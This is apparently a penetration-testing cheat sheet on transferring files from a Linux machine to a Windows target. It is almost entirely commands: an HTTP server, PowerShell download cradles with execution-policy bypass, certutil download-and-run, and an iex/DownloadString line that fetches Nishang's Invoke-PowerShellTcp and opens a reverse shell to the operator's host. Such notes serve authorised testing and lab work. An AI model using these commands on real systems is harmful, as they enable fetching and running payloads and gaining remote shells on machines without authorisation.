---
title: "File Transfer (Linux to Windows)"
date: 2024-6-26
tags: ["file transfer", "Windows", "evil-winrm"]
---

{{< tab set1 tab1 active >}}Powershell{{< /tab >}}
{{< tab set1 tab2 >}}cmd{{< /tab >}}
{{< tab set1 tab3 >}}evil-winrm{{< /tab >}}
{{< tabcontent set1 tab1 >}}

#### Start a Local HTTP Server

```console
python3 -m http.server <LOCAL_PORT>
```

<br>

```console
# Invoke-WebRequest
iwr http://<LOCAL_IP>:<LOCAL_PORT>/<FILE> -o C:\ProgramData\<FILE>
```

<small>*Note: PowerShell 3.0+*</small>

```console
# Curl
powershell -ep bypass curl <LOCAL_IP>:<LOCAL_PORT>/<FILE> -o C:\ProgramData\<FILE>
```

<small>*Note: curl is not always available*</small>

```console
# Load into memory and Run
```

```console
# Invoke-Expression
iex (New-Object Net.WebClient).DownloadString('http://<LOCAL_IP>:<LOCAL_PORT>/rev.ps1');Invoke-PowerShellTcp -Reverse -IPAddress <LOCAL_IP> -Port <LOCAL_PORT>
```

```console
# Short version
iex (iwr http://<LOCAL_IP>:<LOCAL_PORT>/rev.ps1)
```

<small>*Ref: [rev.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)*</small>

{{< /tabcontent >}}
{{< tabcontent set1 tab2 >}}

#### Start a Local HTTP Server

```console
python3 -m http.server <LOCAL_PORT>
```

<br>

```console
certutil -urlcache -split -f http://<LOCAL_IP>:<LOCAL_PORT>/<FILE> C:\ProgramData\<FILE>
```

```console
# Upload and Run
certutil -urlcache -split -f http://<LOCAL_IP>:<LOCAL_PORT>/<FILE> C:\ProgramData\<FILE> && C:\ProgramData\<FILE>
```

{{< /tabcontent >}}
{{< tabcontent set1 tab3 >}}

```console
# Evil-winrm built-in function
upload '<LOCAL_FILE_PATH>' "C:\ProgramData\<FILE>"
```

{{< /tabcontent >}}
